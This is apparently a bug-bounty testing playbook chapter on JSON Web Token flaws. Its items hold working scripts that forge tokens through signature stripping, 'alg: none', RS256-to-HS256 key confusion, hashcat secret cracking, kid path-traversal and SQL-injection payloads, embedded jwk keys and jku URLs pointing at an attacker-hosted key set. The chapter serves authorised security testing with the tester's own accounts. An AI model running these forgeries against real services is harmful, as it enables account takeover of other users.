# JWT · JWT & signed-token flaws

> The application trusts claims in a token that the client holds, and the check that is supposed to make those
> claims tamper-proof is missing, downgradable or keyed with something the attacker can learn. A working forgery
> is account takeover of any user and is rated high to critical. Lifetime, revocation and "data in the payload"
> findings are low and often excluded.

| | |
|---|---|
| **Class** | `jwt` |
| **Applies when** | http, jwt |
| **Pays** | 13 disclosed reports, 6 paid, median $1,800, top $10,000. The paid ones forged or replayed a token that a second component accepted: missing signature verification, algorithm confusion, or a valid service token exposed to the wrong party. |
| **Weaknesses** | Improper Verification of Cryptographic Signature · CWE-347 · Improper Authentication - Generic · CWE-287 · Insufficient Session Expiration · CWE-613 |

## Why it pays

A JWT moves the authorisation decision into a string the attacker can edit. Everything then rests on one
verification call, and that call is easy to get wrong: a library `decode()` used where `verify()` was meant
(#3489490, #1878391), the algorithm read from the attacker-controlled header (#3800870, #1210502), a signing
secret copied from a tutorial (#896649), or a key looked up by a header field that reaches the file system
(#1132160). The reward follows the forged identity: any user is critical, the attacker's own account with a
changed role is high, a longer-lived own session is low.

The second paying shape is not cryptographic. A token valid for one component is shown to a party that should
not hold it, or is accepted by a component it was not minted for (#1040786, #1103582, #1889161).

## The crux question

**If I change one claim in my own token, what exactly stops the server from believing it, and can I satisfy or
remove that check?**

## Applicability probe

```bash
# 1. Tokens in cookies, headers and bundles (three base64url parts, the first decodes to {"alg":...})
grep -rEoh 'eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*' "$E/recon/$H/" | sort -u | head
# 2. Decode header and payload of each distinct token
J='<token>'; python3 - "$J" <<'PY'
import sys, json, base64
d = lambda x: json.loads(base64.urlsafe_b64decode(x + '=' * (-len(x) % 4)))
h, p, s = sys.argv[1].split('.'); print(json.dumps(d(h)), json.dumps(d(p), indent=1), 'sig bytes:', len(s) * 3 // 4)
PY
# 3. Does the server decide on it? Replay one authenticated request with the token removed, then with only the token
curl -sS "${HDR[@]}" -H "Authorization: Bearer $J" -o /dev/null -w '%{http_code}\n' "$T/api/me"
# 4. Published keys
for p in /.well-known/jwks.json /jwks.json /.well-known/openid-configuration /oauth/discovery/keys /api/keys; do
  curl -sS "${HDR[@]}" -o /dev/null -w "%{http_code} $p\n" "$T$p"; done
```

```bash
scripts/sane fact set "$H" jwt=1 --ev "Authorization: Bearer eyJ... (RS256, kid=2024-01) decides /api/me; JWKS at /.well-known/jwks.json"
# an eyJ string exists but removing it changes nothing, or the session is an opaque cookie:
scripts/sane fact set "$H" jwt=0 --ev "only JWT seen is a third-party analytics id; session is opaque cookie sid"
```

Record per token: where it travels, `alg`, `kid`, issuer, audience, lifetime (`exp - iat`) and which requests
depend on it. A JWT that only a third-party widget reads (analytics, chat, captcha) does not make the fact true.

## Triage order

JWT-001 (is the signature checked at all) → JWT-002 (`alg: none`) → JWT-008 (expiry) → JWT-004 (offline crack,
costs no requests) → JWT-003 (key confusion, needs the public key) → JWT-006 (embedded `jwk`) → JWT-005 (`kid`)
→ JWT-007 (`jku`/`x5u`) → JWT-010 (audience and tenant) → JWT-009 (revocation) → JWT-011 (payload contents).

## Items

### JWT-001 · The server accepts a token whose signature bytes were altered or removed

| | |
|---|---|
| **Severity** | Critical when another user's identity is accepted; High when only the attacker's own claims (role, plan, tenant) can be changed |
| **Requires** | account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Improper Verification of Cryptographic Signature · CWE-347 |
| **Prior art** | #3489490, #1878391, #1760403 |

- **Where:** every distinct token from the probe, on every component that reads it: the main API, older API
  versions, the WebSocket handshake, file or export hosts, mobile API hosts. Verification is implemented per
  service; one that decodes without verifying is enough.
- **Test:** keep header and payload, break the signature three ways (flip one character, replace it with `AAAA`,
  drop it leaving the trailing dot). Then change a claim and leave the original signature in place. A verifying
  server rejects all four.
- **How:**
  ```bash
  J='<A token>'; H1=${J%%.*}; R=${J#*.}; P=${R%%.*}; S=${R#*.}
  try(){ printf '%-10s ' "$1"; curl -sS "${HDR[@]}" -H "Authorization: Bearer $2" -o "$E/evidence/$H/JWT-001/$1.txt" \
    -w '%{http_code} %{size_download}\n' "$T/api/me"; }
  try valid   "$J"
  try flipped "$H1.$P.$(printf %s "$S" | sed 's/.$/A/;s/^./B/')"
  try junk    "$H1.$P.AAAA"
  try nosig   "$H1.$P."
  # claim changed, old signature kept: set the subject to victim B (our second account) or flip a role claim
  P2=$(python3 - "$P" <<'PY'
  import sys, json, base64
  p = json.loads(base64.urlsafe_b64decode(sys.argv[1] + '=' * (-len(sys.argv[1]) % 4)))
  p['sub'] = '<B user id>'           # use the claim the app keys on: sub, uid, user_id, email
  print(base64.urlsafe_b64encode(json.dumps(p, separators=(',', ':')).encode()).rstrip(b'=').decode())
  PY
  )
  try claim "$H1.$P2.$S"
  ```
  If the token rides in a cookie, replace the header with `-b "<cookie name>=<token>"`.
- **Proof:** the request with a broken signature and a changed subject returns victim B's profile (B is our own
  second account), saved raw next to the same request with A's valid token returning A's profile.
- **Not a finding when:** the 200 comes from a session cookie sent alongside (remove every other credential and
  repeat); the endpoint is public and answers 200 without any token; the body is a cached copy of the earlier
  valid response (add a cache buster); the token is an OAuth `id_token` kept only for display while an opaque
  session decides access.
- **Escalate:** enumerate what the forged identity reaches: an admin `role` claim (BAC-014), another tenant id
  (BAC-008). Check each sibling service and API version separately; file one report naming all of them.

### JWT-002 · The server accepts a token with the algorithm set to none

| | |
|---|---|
| **Severity** | Critical when another user's identity is accepted; High when only own claims can be changed |
| **Requires** | account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Improper Verification of Cryptographic Signature · CWE-347 |
| **Prior art** | #3489490, #1878391 |

- **Where:** tokens that JWT-001 showed are verified in their original form. Old library versions and hand-made
  verifiers read `alg` from the header and skip verification for `none`.
- **Test:** rewrite the header with `alg` set to `none` in several spellings (filters are case-sensitive string
  compares), empty the signature, and send with and without the trailing dot.
- **How:**
  ```bash
  J='<A token>'
  python3 - "$J" > "$E/evidence/$H/JWT-002/cands.txt" <<'PY'
  import sys, json, base64
  b = lambda o: base64.urlsafe_b64encode(json.dumps(o, separators=(',', ':')).encode()).rstrip(b'=').decode()
  u = lambda x: json.loads(base64.urlsafe_b64decode(x + '=' * (-len(x) % 4)))
  h, p, _ = sys.argv[1].split('.'); h, p = u(h), u(p)
  # p['sub'] = '<B user id>'        # second pass, after an unchanged payload is accepted
  for alg in ('none', 'None', 'NONE', 'nOnE'):
      h['alg'] = alg
      print(b(h) + '.' + b(p) + '.'); print(b(h) + '.' + b(p))
  PY
  while read -r F; do curl -sS "${HDR[@]}" -H "Authorization: Bearer $F" -o /dev/null \
    -w "%{http_code} %{size_download} ${F:0:24}\n" "$T/api/me"; sleep 1; done < "$E/evidence/$H/JWT-002/cands.txt"
  ```
- **Proof:** an unsigned token naming victim B (our second account) returns B's data. Attach the decoded forged
  header and payload, the request and the response.
- **Not a finding when:** the unsigned token is accepted only with the payload unchanged and a second credential
  is present; or the response is the public, unauthenticated variant of the endpoint (compare with no token at
  all: same status and length means the token was ignored, not accepted).
- **Escalate:** as JWT-001. When `none` is rejected but JWT-001 showed the header is parsed loosely, go to
  JWT-003 and JWT-006.

### JWT-003 · An RS256 or ES256 token re-signed with HS256 using the public key as the secret is accepted

| | |
|---|---|
| **Severity** | Critical when another user's identity is accepted; High when only own claims can be changed |
| **Requires** | account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Verification of Cryptographic Signature · CWE-347 |
| **Prior art** | #3800870, #1210502 |

- **Where:** tokens with an asymmetric `alg` (RS256/384/512, ES256, PS256) whose public key you can obtain: the
  JWKS URL from the probe, `jwks_uri` in the OpenID configuration, a PEM in the JS bundle or mobile app, the
  key in API documentation.
- **Test:** the verifier calls `verify(token, publicKey)` and lets the header choose the algorithm. With
  `alg: HS256` the library uses the public key bytes as the HMAC secret, which the attacker knows. The exact
  bytes matter, so try SPKI and PKCS#1 PEM, each with and without the final newline.
- **How:**
  ```bash
  curl -sS "${HDR[@]}" "$T/.well-known/jwks.json" -o "$E/evidence/$H/JWT-003/jwks.json"
  python3 - '<A token>' "$E/evidence/$H/JWT-003/jwks.json" > "$E/evidence/$H/JWT-003/cands.txt" <<'PY'
  import sys, json, base64, hmac, hashlib
  from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
  from cryptography.hazmat.primitives import serialization as S
  b = lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
  ub = lambda x: base64.urlsafe_b64decode(x + '=' * (-len(x) % 4))
  h, p, _ = sys.argv[1].split('.'); hdr = json.loads(ub(h)); keys = json.load(open(sys.argv[2]))['keys']
  k = next((k for k in keys if k.get('kid') == hdr.get('kid')), keys[0])
  pub = RSAPublicNumbers(int.from_bytes(ub(k['e']), 'big'), int.from_bytes(ub(k['n']), 'big')).public_key()
  hdr['alg'] = 'HS256'
  # second pass: decode p, set the subject to victim B, re-encode
  msg = b(json.dumps(hdr, separators=(',', ':')).encode()) + b'.' + p.encode()
  for fmt in (S.PublicFormat.SubjectPublicKeyInfo, S.PublicFormat.PKCS1):
      pem = pub.public_bytes(S.Encoding.PEM, fmt)
      for key in (pem, pem.rstrip(b'\n')):
          print((msg + b'.' + b(hmac.new(key, msg, hashlib.sha256).digest())).decode())
  PY
  while read -r F; do curl -sS "${HDR[@]}" -H "Authorization: Bearer $F" -o /dev/null \
    -w '%{http_code} %{size_download}\n' "$T/api/me"; sleep 1; done < "$E/evidence/$H/JWT-003/cands.txt"
  ```
  For an EC key, build the PEM from `x`/`y` with `EllipticCurvePublicNumbers` and run the same loop. With no
  published key, two RS256 tokens with different payloads are enough to recover `n` offline (the `rsa_sign2n`
  method); do that only if the rest of the asset justifies the time.
- **Proof:** an HS256 token signed with the public key, naming victim B, returns B's data. Attach the key source
  URL, the exact key bytes used (hex of the first and last 16 bytes) and the request/response pair.
- **Not a finding when:** every candidate returns the same 401 as a token with a junk signature; or the verifier
  pins the algorithm (`algorithms=["RS256"]`), which shows as an "invalid algorithm" error distinct from
  "invalid signature".
- **Escalate:** as JWT-001. If the same key pair signs tokens for several products, test each audience (JWT-010).

### JWT-004 · The HMAC signing secret is weak or public and can be recovered offline from our own token

| | |
|---|---|
| **Severity** | Critical when a token forged with the recovered secret is accepted for another user; None for a cracked secret that was never shown to be accepted |
| **Requires** | account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Use of Hard-coded Cryptographic Key · CWE-321 |
| **Prior art** | #896649, #1380121, #1387366, #1595009 |

- **Where:** tokens with `alg` HS256/384/512. Also framework session cookies signed the same way (Flask
  `session`, Express `connect.sid`, Django signed cookies, Rails with a leaked `secret_key_base`).
- **Test:** an HMAC token is its own offline oracle. Run the token against lists of known default and tutorial
  secrets, then a general wordlist. Cracking runs on our machine against our own token and sends nothing to the
  target.
- **How:**
  ```bash
  printf '%s\n' '<A token>' > "$E/evidence/$H/JWT-004/jwt.txt"
  # wallarm/jwt-secrets list first, then product names, host labels and a general list
  hashcat -a 0 -m 16500 "$E/evidence/$H/JWT-004/jwt.txt" ~/wordlists/jwt.secrets.list --potfile-disable -o "$E/evidence/$H/JWT-004/cracked.txt"
  hashcat -a 0 -m 16500 "$E/evidence/$H/JWT-004/jwt.txt" ~/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --potfile-disable
  # Flask session cookie: flask-unsign --unsign --cookie '<cookie>' --wordlist ~/wordlists/jwt.secrets.list
  # forge with the recovered secret
  python3 - '<A token>' '<secret>' <<'PY'
  import sys, jwt
  t, k = sys.argv[1:3]; h = jwt.get_unverified_header(t)
  c = jwt.decode(t, k, algorithms=[h['alg']], options={'verify_exp': False, 'verify_aud': False})
  c['sub'] = '<B user id>'
  print(jwt.encode(c, k, algorithm=h['alg'], headers={x: h[x] for x in h if x not in ('alg', 'typ')}))
  PY
  curl -sS "${HDR[@]}" -H "Authorization: Bearer <forged>" -D- "$T/api/me"
  ```
- **Proof:** the secret (first and last two characters shown, the rest redacted in the report body, full value
  in a private attachment), plus a forged token for victim B accepted by the live API.
- **Not a finding when:** the secret opens only a token nobody verifies (a client-side preference blob), or the
  cracked token belongs to a third-party service the programme does not own (`third-party`). A strong secret is
  one that survives the lists above; do not report "HS256 is used".
- **Escalate:** a framework secret often signs more than sessions: password-reset tokens (AUT-002), signed
  URLs, serialized cookies (DSR chapter: a known Rails or Flask secret plus a deserializing cookie format is
  code execution; prove with a harmless read and stop).

### JWT-005 · The kid header reaches a file path or a database query and selects an attacker-known key

| | |
|---|---|
| **Severity** | Critical when a token signed with the attacker-chosen key is accepted for another user; High for SQL injection through `kid` shown by an error or timing difference alone |
| **Requires** | account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Path Traversal · CWE-22 |
| **Prior art** | #1132160, #3800870 |

- **Where:** tokens whose header has a `kid`. The risk is highest when `kid` looks like a file name, a path, a
  UUID stored in a table, or changes the error text when altered.
- **Test:** first see whether `kid` is used: change one character and compare the error with an unchanged
  token carrying a junk signature. Then point `kid` at content you know. Path traversal: a file with predictable
  bytes. SQL: a `UNION` that returns a key you chose. Sign with HS256 using those bytes.
- **How:**
  ```bash
  python3 - '<A token>' > "$E/evidence/$H/JWT-005/cands.txt" <<'PY'
  import sys, json, base64, hmac, hashlib
  b = lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
  ub = lambda x: base64.urlsafe_b64decode(x + '=' * (-len(x) % 4))
  h, p, _ = sys.argv[1].split('.'); hdr = json.loads(ub(h))
  cases = [  # (kid, key bytes the server will read)
      ('../../../../../../dev/null', b''),
      ('../../../../../../proc/sys/kernel/randomize_va_space', b'2\n'),
      ('/dev/null', b''),
      ("zz' UNION SELECT 'k1'-- -", b'k1'),
      ('zz" UNION SELECT "k1"-- -', b'k1'),
  ]
  for kid, key in cases:
      hdr.update(alg='HS256', kid=kid)
      msg = b(json.dumps(hdr, separators=(',', ':')).encode()) + b'.' + p.encode()
      print((msg + b'.' + b(hmac.new(key, msg, hashlib.sha256).digest())).decode())
  PY
  while read -r F; do curl -sS "${HDR[@]}" -H "Authorization: Bearer $F" -o /dev/null \
    -w '%{http_code} %{size_download} %{time_total}\n' "$T/api/me"; sleep 1; done < "$E/evidence/$H/JWT-005/cands.txt"
  ```
  Some libraries refuse an empty HMAC key; the `randomize_va_space` case covers those. When the original
  algorithm is RS256, the key-file case also needs the algorithm switch to be allowed (JWT-003).
- **Proof:** a token with the injected `kid`, signed with the known bytes and naming victim B, returns B's data.
  For the SQL variant without forgery: two requests whose only difference is a true and a false condition in
  `kid`, with different responses, repeated three times.
- **Not a finding when:** `kid` is matched against an in-memory map of keys (any unknown value gives the same
  "unknown key" error and no timing difference), or the response differs only because the WAF blocked the
  payload (a 403 with the WAF's body is not the application's answer).
- **Escalate:** a `kid` that reads files is also a file-existence oracle (LFI chapter); a `kid` in SQL is plain
  SQL injection (SQL chapter). Report the forgery, and the injection as its root cause, in one report.

### JWT-006 · The verifier trusts a public key embedded in the token's own jwk header

| | |
|---|---|
| **Severity** | Critical when another user's identity is accepted; High when only own claims can be changed |
| **Requires** | account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Improper Verification of Cryptographic Signature · CWE-347 |
| **Prior art** | #1210502, #3489490 |

- **Where:** tokens with an asymmetric `alg`, whether or not the original header carries `jwk` or `x5c`.
- **Test:** generate our own RSA key, sign the token with it and place the matching public key in the `jwk`
  header (and as a self-signed certificate in `x5c`). A verifier that takes the key from the header instead of
  its own key store verifies our signature with our key.
- **How:**
  ```bash
  python3 - '<A token>' <<'PY'
  import sys, json, jwt
  from cryptography.hazmat.primitives.asymmetric import rsa
  from jwt.algorithms import RSAAlgorithm
  t = sys.argv[1]; key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
  c = jwt.decode(t, options={'verify_signature': False}); h = jwt.get_unverified_header(t)
  # c['sub'] = '<B user id>'        # second pass, after an unchanged payload is accepted
  jwk = json.loads(RSAAlgorithm.to_jwk(key.public_key())); jwk['kid'] = h.get('kid', 'k1')
  print(jwt.encode(c, key, algorithm='RS256', headers={'kid': jwk['kid'], 'jwk': jwk}))
  PY
  curl -sS "${HDR[@]}" -H "Authorization: Bearer <forged>" -D- -o "$E/evidence/$H/JWT-006/resp.txt" "$T/api/me"
  ```
  For `x5c`: `openssl req -x509 -newkey rsa:2048 -nodes -keyout k.pem -out c.pem -subj /CN=jwt006 -days 2`, then
  put the base64 DER of `c.pem` in `"x5c": ["..."]` and sign with `k.pem`.
- **Proof:** a token signed with our key and carrying that key in its header returns victim B's data.
- **Not a finding when:** the server answers with the public response for an invalid token, or accepts the token
  only because a second credential was sent. A `jwk` header that is parsed and then ignored (same 401 as a junk
  signature) is the correct behaviour.
- **Escalate:** when the embedded key is rejected, the server may still fetch a key by URL: JWT-007.

### JWT-007 · The verifier fetches its key from a jku or x5u URL taken from the token header

| | |
|---|---|
| **Severity** | Critical when a token verified with the attacker-hosted key is accepted for another user; Medium for a server-side fetch to an attacker URL without forgery (treat as blind SSRF) |
| **Requires** | account, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Verification of Cryptographic Signature · CWE-347 |
| **Prior art** | #3303283, #1210502, #3489490 |

- **Where:** tokens with `jku`, `x5u` or an `iss` that the verifier resolves to a JWKS (OIDC discovery,
  federation and "bring your own identity provider" features). Also try adding the header where it is absent.
- **Test:** host a JWKS containing our public key on the callback host, point `jku` at it and sign with our
  key. Watch the callback log: a fetch proves the header is followed; an accepted token proves the key is
  trusted. If only allow-listed hosts are fetched, test the allow-list as a URL filter.
- **How:**
  ```bash
  # 1. key pair and JWKS, served from the OOB host as /jwks.json
  python3 - > jwks.json <<'PY'
  import json
  from cryptography.hazmat.primitives.asymmetric import rsa
  from cryptography.hazmat.primitives import serialization as S
  from jwt.algorithms import RSAAlgorithm
  k = rsa.generate_private_key(public_exponent=65537, key_size=2048)
  open('jwt007.pem', 'wb').write(k.private_bytes(S.Encoding.PEM, S.PrivateFormat.PKCS8, S.NoEncryption()))
  j = json.loads(RSAAlgorithm.to_jwk(k.public_key())); j.update(kid='jwt007', use='sig', alg='RS256')
  print(json.dumps({'keys': [j]}))
  PY
  # 2. token pointing at it
  python3 - '<A token>' "https://$OOB/jwks.json" <<'PY'
  import sys, jwt
  t, url = sys.argv[1:3]; c = jwt.decode(t, options={'verify_signature': False})
  print(jwt.encode(c, open('jwt007.pem').read(), algorithm='RS256', headers={'kid': 'jwt007', 'jku': url}))
  PY
  curl -sS "${HDR[@]}" -H "Authorization: Bearer <forged>" -D- "$T/api/me"
  # allow-list bypass shapes for the jku value:
  #   https://trusted.example@$OOB/jwks.json   https://$OOB/jwks.json#trusted.example   https://trusted.example.$OOB/jwks.json
  #   https://trusted.example/redirect?url=https://$OOB/jwks.json   (an open redirect on the trusted host)
  ```
- **Proof:** the request for `/jwks.json` from the target's address space in the callback log, followed by the
  forged token for victim B being accepted. The fetch alone is reported as SSRF, not as authentication bypass.
- **Not a finding when:** the fetch comes from a browser or from a third-party identity service rather than
  from the target; or the key is fetched, cached and then compared with a pinned thumbprint (token still
  rejected).
- **Escalate:** the fetcher is a server-side HTTP client: run SSR-002 and SSR-003 against the `jku` value. An
  open redirect on an allow-listed host (RDR chapter) completes the allow-list bypass.

### JWT-008 · A token is accepted after its exp time has passed

| | |
|---|---|
| **Severity** | Low standalone; Medium when the token is long-lived by design and cannot be revoked; High only as the reason another leak stays exploitable |
| **Requires** | account |
| **Excluded by** | session-expiry |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Insufficient Session Expiration · CWE-613 |
| **Prior art** | #1760403, #1878391, #1593413 |

- **Where:** access tokens with a short `exp` (minutes to hours). Password-reset, e-mail-verification and invite
  JWTs, where expiry is the only thing that ends their life.
- **Test:** keep a token, wait until `exp` has passed, replay it unchanged. No forgery is involved, so this
  works even when the signature check is sound. Also check tokens with no `exp` claim at all.
- **How:**
  ```bash
  J='<A token>'
  python3 - "$J" <<'PY'
  import sys, json, base64, time
  p = sys.argv[1].split('.')[1]; c = json.loads(base64.urlsafe_b64decode(p + '=' * (-len(p) % 4)))
  print('iat', c.get('iat'), 'exp', c.get('exp'), 'lifetime_s', (c.get('exp') or 0) - (c.get('iat') or 0),
        'seconds_left', (c.get('exp') or 0) - int(time.time()))
  PY
  # after exp + 120 s (clock-skew leeway is normally 60 s or less):
  curl -sS "${HDR[@]}" -H "Authorization: Bearer $J" -D- -o "$E/evidence/$H/JWT-008/after-exp.txt" "$T/api/me"; date -u +%s
  ```
- **Proof:** the decoded `exp`, the wall-clock time of the replay (from the response `Date` header) at least two
  minutes later, and a 200 carrying account data.
- **Not a finding when:** the replay is within the verifier's leeway; the API silently refreshed the token
  because a refresh cookie was also sent (remove it); or the "expired" token is an `id_token` nobody verifies
  after login. A lifetime the programme finds too long (30 days) is a design choice, not a bypass.
- **Escalate:** pair with any token leak (INF chapter: tokens in logs, URLs, Referer) to show the leak has no
  time limit. Check JWT-009 next.

### JWT-009 · A token still works after logout, password change or account deactivation

| | |
|---|---|
| **Severity** | Low standalone; Medium when a removed team member or disabled account keeps API access |
| **Requires** | account |
| **Excluded by** | session-expiry |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Insufficient Session Expiration · CWE-613 |
| **Prior art** | #4000084, #1593413, #337426, #247721 |

- **Where:** stateless access tokens, refresh tokens, API tokens minted from the session. The events that should
  end them: logout, "log out everywhere", password change, password reset, 2FA enrolment, role downgrade,
  removal from a team, account disable.
- **Test:** capture the token, perform the event in the browser session, replay the captured token. Then test
  the refresh token the same way: a revoked session whose refresh token still mints access tokens is the
  stronger result.
- **How:**
  ```bash
  J='<A access token>'; RT='<A refresh token>'
  curl -sS "${HDR[@]}" -H "Authorization: Bearer $J" -o /dev/null -w 'before %{http_code}\n' "$T/api/me"
  curl -sS "${HDR[@]}" -H "Authorization: Bearer $J" -X POST "$T/api/logout" -o /dev/null -w 'logout %{http_code}\n'
  curl -sS "${HDR[@]}" -H "Authorization: Bearer $J" -D- -o "$E/evidence/$H/JWT-009/after-logout.txt" "$T/api/me"
  curl -sS "${HDR[@]}" -X POST "$T/oauth/token" -d "grant_type=refresh_token&refresh_token=$RT" -D- \
    -o "$E/evidence/$H/JWT-009/refresh-after-logout.txt"
  # repeat with: password change, removal of the user from the team by the admin account, account disable
  ```
- **Proof:** the event (request and response), then the old token returning account data with a later `Date`.
  For the team case: admin removes member A, A's old token still reads team data ten minutes later.
- **Not a finding when:** the access token lives a few minutes and the refresh token is revoked (the standard
  stateless design); the programme lists session handling as out of scope (`session-expiry`); or logout is
  documented as local-only and a "log out all devices" control exists and works.
- **Escalate:** the removed-member case is an access-control finding and is filed there (BAC-015). A token that
  survives password reset turns any one-time token theft into permanent access: say so, with the lifetime.

### JWT-010 · A token issued for one audience, environment or tenant is accepted by another

| | |
|---|---|
| **Severity** | High when the token grants access in a tenant or service where the user has no account; Medium when it only crosses products the same user may use |
| **Requires** | account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Missing Critical Step in Authentication · CWE-304 |
| **Prior art** | #1889161, #853145, #3999856 |

- **Where:** organisations with several products behind one identity provider or one signing key; staging and
  production sharing a key; per-tenant hosts (`<tenant>.app.example`); tokens with `aud`, `iss`, `azp`, `tid`,
  `org` or `env` claims; low-value tokens (unsubscribe, e-mail verification, file download) signed with the
  same key as session tokens.
- **Test:** present the unmodified token where it was not meant to work. The signature is valid, so only a
  claim check can refuse it. Try: service A's token on service B; a staging token on production; tenant X's
  token on tenant Y's host; a purpose-limited token as a session token.
- **How:**
  ```bash
  J='<A token from service 1 or tenant X>'
  for U in "https://<service-2 host>/api/me" "https://<tenant-Y host>/api/me" "https://<production host>/api/me"; do
    curl -sS "${HDR[@]}" -H "Authorization: Bearer $J" -o "$E/evidence/$H/JWT-010/$(echo "$U" | md5sum | cut -c1-8).txt" \
      -w "%{http_code} %{size_download} $U\n" "$U"; done
  # purpose confusion: use an e-mail-verification or download JWT as the bearer token
  curl -sS "${HDR[@]}" -H "Authorization: Bearer <verification or download JWT>" -D- "$T/api/me"
  ```
  Every host in the loop must be in scope. Decode the token first and note `aud`/`iss`; say in the note which
  claim should have refused it.
- **Proof:** a response from the second service, tenant or environment that returns data or performs a read the
  account has no right to there, with the decoded token showing the mismatching `aud`, `iss` or tenant claim.
- **Not a finding when:** single sign-on across the products is the design and the user has the same rights in
  both; or the second service accepts the token and then returns only what an anonymous user sees.
- **Escalate:** a self-registered account on a low-value product whose token works on an internal or admin
  product is the high-paying form. For tenant confusion continue with BAC-008.

### JWT-011 · The token payload exposes secrets, or a privileged token is delivered to a party that should not hold it

| | |
|---|---|
| **Severity** | High when the exposed token or secret gives access beyond the holder's own rights; Low for personal data of the holder only; None for identifiers |
| **Requires** | account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Insufficiently Protected Credentials · CWE-522 |
| **Prior art** | #1040786, #1103582, #638635, #1080901 |

- **Where:** every JWT the application hands out, including ones not used for the session: integration tokens
  shown in settings pages, tokens in redirect URLs, tokens embedded in HTML for a third-party widget (help
  desk, chat, analytics SSO), signed upload or download tickets, service-to-service tokens echoed in responses
  or error messages.
- **Test:** decode each payload and read it. Look for credentials (API keys, passwords, internal service
  tokens), other users' data, internal host names, and claims that reveal a wider audience than the page that
  received the token. For third-party SSO tokens (Zendesk, Intercom), check whether the signing happens in the
  browser, which puts the shared secret in the bundle.
- **How:**
  ```bash
  grep -rEoh 'eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*' "$E/recon/$H/" | sort -u | while read -r J; do
    python3 - "$J" <<'PY'
  import sys, json, base64
  d = lambda x: json.loads(base64.urlsafe_b64decode(x + '=' * (-len(x) % 4)))
  h, p, _ = sys.argv[1].split('.'); print(json.dumps(d(h)), json.dumps(d(p)))
  PY
  done | tee "$E/evidence/$H/JWT-011/decoded.txt" | grep -iE 'secret|passw|api_?key|token|internal|admin|scope|aud'
  # client-side signing: the shared secret sits next to the signing call in the bundle
  grep -rnE 'HS256|jsrsasign|KJUR\.jws|jwt\.sign|sign\(\{' "$E/recon/$H/js/" | head -20
  ```
- **Proof:** the decoded payload with the secret partly redacted, plus one request showing the secret or token
  works for something the holder should not reach (an internal API answers, another user's object is returned).
- **Not a finding when:** the payload holds only the holder's own id, e-mail, role and expiry: a JWT is encoded,
  not encrypted, and that is its normal content. A token that is exposed only to its own user and grants only
  that user's rights is not a leak.
- **Escalate:** a service token accepted elsewhere is JWT-010. A signing secret in the bundle is JWT-004 without
  the cracking step: forge and prove on victim B.

## Graveyard

- **"The token is not encrypted" / "the payload is base64".** A JWS is readable by design. Closed N/A unless the
  payload holds a secret (JWT-011).
- **Long lifetime, no expiry on refresh tokens, token valid after logout.** Closed informative or as accepted
  risk on most programmes (`session-expiry`). Reported only with a concrete case: removed member keeps access.
- **`alg: none` or a tampered token "accepted" by a public endpoint.** The endpoint never checked the token.
  Compare with a request that has no token before claiming anything.
- **Cracked secret for a token nobody verifies, or belonging to a vendor.** No impact (`third-party`).
- **HS256 in use, RS256 with a 2048-bit key, `kid` present, JWKS reachable.** Observations, not findings.
- **Token in local storage instead of a cookie.** Design preference; closed N/A (`missing-headers` covers the
  cookie-flag variants).
- **Scanner output listing "JWT weak algorithm" without a forged token being accepted** (`automated`).

## Chains

- INF (signing key, `secret_key_base` or `.env` exposed) → JWT-004: forge without cracking.
- JWT-007 → SSR-002, SSR-003: the key fetcher is an SSRF primitive. RDR (open redirect on an allow-listed key
  host) → JWT-007.
- JWT-005 → SQL and LFI chapters: the `kid` sink is an injection point in its own right.
- JWT-001 to JWT-006 → BAC-014 (forged role claim), BAC-008 (forged tenant claim).
- XSS or INF (token leak) → JWT-008, JWT-009: no expiry or revocation makes a one-time leak permanent.
- OAU-009 (OIDC `id_token` validation at the client) shares the forging techniques of JWT-001 to JWT-003.
- JWT-004 → AUT-004: the same framework secret often signs password-reset tokens.

## Sources

- `kb/reports/jwt.md` and `kb/reports/all/jwt.md`: the disclosed reports this chapter is built from.
- HexBrain: `get_testing_playbook {"topic":"JWT"}`, `find_payloads {"topic":"JSON Web Token"}`.
- PortSwigger Web Security Academy, JWT attacks; OWASP WSTG-SESS-10; PayloadsAllTheThings, JSON Web Token.
- RFC 7515 (JWS), RFC 7519 (JWT), RFC 8725 (JWT Best Current Practices).
- Tim McLean, "Critical vulnerabilities in JSON Web Token libraries" (2015): `alg: none` and RS/HS confusion.
